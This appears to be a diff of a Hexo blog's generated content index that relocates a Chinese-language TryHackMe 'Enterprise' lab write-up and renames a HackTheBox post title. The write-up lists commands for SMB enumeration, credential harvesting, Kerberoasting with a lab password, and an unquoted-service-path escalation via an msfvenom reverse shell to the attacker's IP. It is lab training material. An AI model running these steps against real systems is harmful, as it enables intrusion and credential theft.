@@ -932,6 +932,57 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
       </tags>
   </entry>
   <entry>
+    <title>Enterprise on Tryhackme</title>
+    <url>/2024/03/16/enterprise-thm/</url>
+    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>好欸現在在當科班志工owo<br>Victim’s IP : 10.10.3.132<br>Victim’s Host : lab.enterprise.thm<br>Attacker’s IP : 10.9.195.189  </p>
+<h2 id="Write-up"><a href="#Write-up" class="headerlink" title="Write up"></a>Write up</h2><h3 id="RECON"><a href="#RECON" class="headerlink" title="RECON"></a>RECON</h3><h4 id="port-scan"><a href="#port-scan" class="headerlink" title="port scan"></a>port scan</h4><p><strong>Command</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rustscan -a 10.10.3.132 --<span class="built_in">ulimit</span> 5000 -- -sC -sV -Pn</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/rkkQVjMCT.png" alt="image">  </p>
+<p><img src="https://hackmd.io/_uploads/HksEEofA6.png" alt="image">  </p>
+<p>在這步驟，發現機器有開啟smb, rdp, http(在port 80 以及 port 7790)，並獲取DNS域名為LAB.ENTERPRISE.THM  </p>
+<h4 id="directory-enumeration"><a href="#directory-enumeration" class="headerlink" title="directory enumeration"></a>directory enumeration</h4><p><strong>Command</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch --url http://lab.enterprise.thm/</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/Hyw-DsMRT.png" alt="image">  </p>
+<p><img src="https://hackmd.io/_uploads/H12mwsGAT.png" alt="image">  </p>
+<p>沒料，還被嘴qq  </p>
+<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><h4 id="smb"><a href="#smb" class="headerlink" title="smb"></a>smb</h4><p><del>其實這步驟是rabbit hole但我搞了一個多小時</del><br>先嘗試直接連線：<br><strong>Command</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smbclient -L \\\\lab.enterprise.thm\\Users -N</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/BJ4sDjfCa.png" alt="image"><br>連不上QwQ<br>改為使用<code>crackmapexec</code>中的<code>spider_plus</code>去抓資料：<br><strong>Command</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.10.3.132 -u <span class="string">&#x27;anonymous&#x27;</span> -p <span class="string">&#x27;&#x27;</span> -M spider_plus -o READ_ONLY=<span class="literal">true</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/S1RldjzRp.png" alt="image"><br>雖然有error訊息但還是成功將資料抓到<code>/tmp/cme_spider_plus/10.10.3.132/</code>裡面了<br><strong>Command</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tree</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/rJ1qOsM0T.png" alt="image">  </p>
+<p>找到powershell歷史紀錄，檔案路徑：<br><code>/tmp/cme_spider_plus/10.10.3.132/Users/LAB-ADMIN/AppData/Roaming/Microsoft/Windows/Powershell/PSReadline/Consolehost_hisory.txt</code>  </p>
+<p><img src="https://hackmd.io/_uploads/BJhA_sGA6.png" alt="image">  </p>
+<p>找到使用者<code>replication</code>的密碼  </p>
+<h4 id="OSINT"><a href="#OSINT" class="headerlink" title="OSINT"></a>OSINT</h4><p>連上 port 7990(http) 後的畫面：  </p>
+<p><img src="https://hackmd.io/_uploads/Bk3GKoMAT.png" alt="image">  </p>
+<p>去github上挖寶  </p>
+<p><img src="https://hackmd.io/_uploads/HJKwtsMAp.png" alt="image"></p>
+<p>嘿，點開people發現只有一個人：  </p>
+<p><img src="https://hackmd.io/_uploads/BJe9KiMC6.png" alt="image">  </p>
+<p>最後找到上面唯一一支腳本的commit<br><a href="https://github.com/Nik-enterprise-dev/mgmtScript.ps1/commit/bc40c9f237bfbe7be7181e82bebe7c0087eb7ed8">https://github.com/Nik-enterprise-dev/mgmtScript.ps1/commit/bc40c9f237bfbe7be7181e82bebe7c0087eb7ed8</a><br>找到使用者nik帳號密碼!</p>
+<h4 id="smb-again"><a href="#smb-again" class="headerlink" title="smb again"></a>smb again</h4><p>使用crackmapexec裡面的rid-brute進行使用者&#x2F;群組暴破<br><strong>Command</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crackmapexec smb lab.enterprise.thm -u <span class="string">&#x27;guest&#x27;</span> -p <span class="string">&#x27;&#x27;</span> --rid-brute</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/S1QVqoGA6.png" alt="image"><br>湊出userlist.txt  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Guest</span><br><span class="line">krbtgt</span><br><span class="line">atlbitbucket</span><br><span class="line">LAB-DC$</span><br><span class="line">DnsAdmins</span><br><span class="line">DnsUpdateProxy</span><br><span class="line">ENTERPRISE$</span><br><span class="line">bitbucket</span><br><span class="line">nik</span><br><span class="line">replication</span><br><span class="line">spooks</span><br><span class="line">korone</span><br><span class="line">banana</span><br><span class="line">Cake</span><br><span class="line">contractor-temp</span><br><span class="line">varg</span><br><span class="line">joiner</span><br></pre></td></tr></table></figure>
+<p>利用他以及剛剛拿到的nik帳號密碼進行SPN獲取：<br><strong>Command</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 GetUserSPNs.py <span class="string">&#x27;lab.enterprise.thm/nik:ToastyBoi!&#x27;</span> -usersfile ~/ctf/tryhackme/enterprise/userlist.txt -dc-ip 10.10.3.132 -request</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/Bye-2sMC6.png" alt="image">  </p>
+<p>利用<code>john</code>進行密碼爆破：<br><img src="https://hackmd.io/_uploads/Bkal42fC6.png" alt="image"></p>
+<h3 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h3><p>RDP進去之後用powershell砸winpeas：<br><img src="https://hackmd.io/_uploads/BJ2YBhMCp.png" alt="image"><br>發現 unquoted path string的vulnerability<br>詳細請見：<a href="https://www.ired.team/offensive-security/privilege-escalation/unquoted-service-paths">https://www.ired.team/offensive-security/privilege-escalation/unquoted-service-paths</a><br>舉例來說<code>C:\Cute Shark\Whale womp.exe</code>在被執行的時候如果有個<code>C:\Cute.exe</code>，<code>C:\Cute Shark\Whale.exe</code>等等的那windows解析時就會被誤判，這時候如果可以用別的方法以更高權限去啟動他就能塞後門進去owo<br>以這台靶機為例，就是可以利用<code>Start-Service zerotieroneservice</code>開啟<code>zeroonetier</code>的服務。<br>總之，那個資料夾裡面有<code>ZeroTier One.exe</code>，就灌一個<code>ZeroTier.exe</code>的reverse shell進去：  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp lhost=10.9.195.189 lport=1004 -f exe -o ./ZeroTier.exe</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/SyxQsuhGCa.png" alt="image"><br>在端口1004拿到shell!!!<br><img src="https://hackmd.io/_uploads/rkC3OhfCp.png" alt="image">  </p>
+<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>neko???  </p>
+]]></content>
+      <tags>
+        <tag>AD</tag>
+        <tag>Windows</tag>
+        <tag>Pentesting</tag>
+        <tag>TryHackMe</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>First Post</title>
     <url>/2023/08/31/first/</url>
     <content><![CDATA[<h2 id="What’s-going-on"><a href="#What’s-going-on" class="headerlink" title="What’s going on"></a>What’s going on</h2><p>Nothing but my old blog goes wrong…</p>
@@ -985,7 +1036,7 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
 <script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
   </entry>
   <entry>
-    <title>Editorial Write Up on HackTheBox</title>
+    <title>Blurry Write Up on HackTheBox</title>
     <url>/2024/06/09/htb-blurry/</url>
     <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>全部寫完有點瑣碎，但我覺得這題利用點很有趣就貼PoC和少數過程就好ㄌ<br>之後有空把他補完(?)(其實這是上周打的但我 6&#x2F;16 才寫)<br>Attacker’s IP : 10.10.14.58<br>Victim’s Host : editorial.htb  </p>
 <h2 id="Write-up"><a href="#Write-up" class="headerlink" title="Write up"></a>Write up</h2><h3 id="clearml-init"><a href="#clearml-init" class="headerlink" title="clearml-init"></a>clearml-init</h3><p>進去網站後會看到setup教學：<br><img src="https://hackmd.io/_uploads/r1aky8hSR.png" alt="image">  </p>
@@ -1129,57 +1180,6 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
         <tag>Pentesting</tag>
         <tag>LD_PRELOAD</tag>
         <tag>MongoDB</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Enterprise on Tryhackme</title>
-    <url>/2024/03/16/enterprise-thm/</url>
-    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>好欸現在在當科班志工owo<br>Victim’s IP : 10.10.3.132<br>Victim’s Host : lab.enterprise.thm<br>Attacker’s IP : 10.9.195.189  </p>
-<h2 id="Write-up"><a href="#Write-up" class="headerlink" title="Write up"></a>Write up</h2><h3 id="RECON"><a href="#RECON" class="headerlink" title="RECON"></a>RECON</h3><h4 id="port-scan"><a href="#port-scan" class="headerlink" title="port scan"></a>port scan</h4><p><strong>Command</strong>  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rustscan -a 10.10.3.132 --<span class="built_in">ulimit</span> 5000 -- -sC -sV -Pn</span><br></pre></td></tr></table></figure>
-<p><img src="https://hackmd.io/_uploads/rkkQVjMCT.png" alt="image">  </p>
-<p><img src="https://hackmd.io/_uploads/HksEEofA6.png" alt="image">  </p>
-<p>在這步驟，發現機器有開啟smb, rdp, http(在port 80 以及 port 7790)，並獲取DNS域名為LAB.ENTERPRISE.THM  </p>
-<h4 id="directory-enumeration"><a href="#directory-enumeration" class="headerlink" title="directory enumeration"></a>directory enumeration</h4><p><strong>Command</strong>  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch --url http://lab.enterprise.thm/</span><br></pre></td></tr></table></figure>
-<p><img src="https://hackmd.io/_uploads/Hyw-DsMRT.png" alt="image">  </p>
-<p><img src="https://hackmd.io/_uploads/H12mwsGAT.png" alt="image">  </p>
-<p>沒料，還被嘴qq  </p>
-<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><h4 id="smb"><a href="#smb" class="headerlink" title="smb"></a>smb</h4><p><del>其實這步驟是rabbit hole但我搞了一個多小時</del><br>先嘗試直接連線：<br><strong>Command</strong>  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smbclient -L \\\\lab.enterprise.thm\\Users -N</span><br></pre></td></tr></table></figure>
-<p><img src="https://hackmd.io/_uploads/BJ4sDjfCa.png" alt="image"><br>連不上QwQ<br>改為使用<code>crackmapexec</code>中的<code>spider_plus</code>去抓資料：<br><strong>Command</strong>  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.10.3.132 -u <span class="string">&#x27;anonymous&#x27;</span> -p <span class="string">&#x27;&#x27;</span> -M spider_plus -o READ_ONLY=<span class="literal">true</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://hackmd.io/_uploads/S1RldjzRp.png" alt="image"><br>雖然有error訊息但還是成功將資料抓到<code>/tmp/cme_spider_plus/10.10.3.132/</code>裡面了<br><strong>Command</strong>  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tree</span><br></pre></td></tr></table></figure>
-<p><img src="https://hackmd.io/_uploads/rJ1qOsM0T.png" alt="image">  </p>
-<p>找到powershell歷史紀錄，檔案路徑：<br><code>/tmp/cme_spider_plus/10.10.3.132/Users/LAB-ADMIN/AppData/Roaming/Microsoft/Windows/Powershell/PSReadline/Consolehost_hisory.txt</code>  </p>
-<p><img src="https://hackmd.io/_uploads/BJhA_sGA6.png" alt="image">  </p>
-<p>找到使用者<code>replication</code>的密碼  </p>
-<h4 id="OSINT"><a href="#OSINT" class="headerlink" title="OSINT"></a>OSINT</h4><p>連上 port 7990(http) 後的畫面：  </p>
-<p><img src="https://hackmd.io/_uploads/Bk3GKoMAT.png" alt="image">  </p>
-<p>去github上挖寶  </p>
-<p><img src="https://hackmd.io/_uploads/HJKwtsMAp.png" alt="image"></p>
-<p>嘿，點開people發現只有一個人：  </p>
-<p><img src="https://hackmd.io/_uploads/BJe9KiMC6.png" alt="image">  </p>
-<p>最後找到上面唯一一支腳本的commit<br><a href="https://github.com/Nik-enterprise-dev/mgmtScript.ps1/commit/bc40c9f237bfbe7be7181e82bebe7c0087eb7ed8">https://github.com/Nik-enterprise-dev/mgmtScript.ps1/commit/bc40c9f237bfbe7be7181e82bebe7c0087eb7ed8</a><br>找到使用者nik帳號密碼!</p>
-<h4 id="smb-again"><a href="#smb-again" class="headerlink" title="smb again"></a>smb again</h4><p>使用crackmapexec裡面的rid-brute進行使用者&#x2F;群組暴破<br><strong>Command</strong>  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crackmapexec smb lab.enterprise.thm -u <span class="string">&#x27;guest&#x27;</span> -p <span class="string">&#x27;&#x27;</span> --rid-brute</span><br></pre></td></tr></table></figure>
-<p><img src="https://hackmd.io/_uploads/S1QVqoGA6.png" alt="image"><br>湊出userlist.txt  </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Guest</span><br><span class="line">krbtgt</span><br><span class="line">atlbitbucket</span><br><span class="line">LAB-DC$</span><br><span class="line">DnsAdmins</span><br><span class="line">DnsUpdateProxy</span><br><span class="line">ENTERPRISE$</span><br><span class="line">bitbucket</span><br><span class="line">nik</span><br><span class="line">replication</span><br><span class="line">spooks</span><br><span class="line">korone</span><br><span class="line">banana</span><br><span class="line">Cake</span><br><span class="line">contractor-temp</span><br><span class="line">varg</span><br><span class="line">joiner</span><br></pre></td></tr></table></figure>
-<p>利用他以及剛剛拿到的nik帳號密碼進行SPN獲取：<br><strong>Command</strong>  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 GetUserSPNs.py <span class="string">&#x27;lab.enterprise.thm/nik:ToastyBoi!&#x27;</span> -usersfile ~/ctf/tryhackme/enterprise/userlist.txt -dc-ip 10.10.3.132 -request</span><br></pre></td></tr></table></figure>
-<p><img src="https://hackmd.io/_uploads/Bye-2sMC6.png" alt="image">  </p>
-<p>利用<code>john</code>進行密碼爆破：<br><img src="https://hackmd.io/_uploads/Bkal42fC6.png" alt="image"></p>
-<h3 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h3><p>RDP進去之後用powershell砸winpeas：<br><img src="https://hackmd.io/_uploads/BJ2YBhMCp.png" alt="image"><br>發現 unquoted path string的vulnerability<br>詳細請見：<a href="https://www.ired.team/offensive-security/privilege-escalation/unquoted-service-paths">https://www.ired.team/offensive-security/privilege-escalation/unquoted-service-paths</a><br>舉例來說<code>C:\Cute Shark\Whale womp.exe</code>在被執行的時候如果有個<code>C:\Cute.exe</code>，<code>C:\Cute Shark\Whale.exe</code>等等的那windows解析時就會被誤判，這時候如果可以用別的方法以更高權限去啟動他就能塞後門進去owo<br>以這台靶機為例，就是可以利用<code>Start-Service zerotieroneservice</code>開啟<code>zeroonetier</code>的服務。<br>總之，那個資料夾裡面有<code>ZeroTier One.exe</code>，就灌一個<code>ZeroTier.exe</code>的reverse shell進去：  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp lhost=10.9.195.189 lport=1004 -f exe -o ./ZeroTier.exe</span><br></pre></td></tr></table></figure>
-<p><img src="https://hackmd.io/_uploads/SyxQsuhGCa.png" alt="image"><br>在端口1004拿到shell!!!<br><img src="https://hackmd.io/_uploads/rkC3OhfCp.png" alt="image">  </p>
-<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>neko???  </p>
-]]></content>
-      <tags>
-        <tag>AD</tag>
-        <tag>Windows</tag>
-        <tag>Pentesting</tag>
-        <tag>TryHackMe</tag>
       </tags>
   </entry>
   <entry>
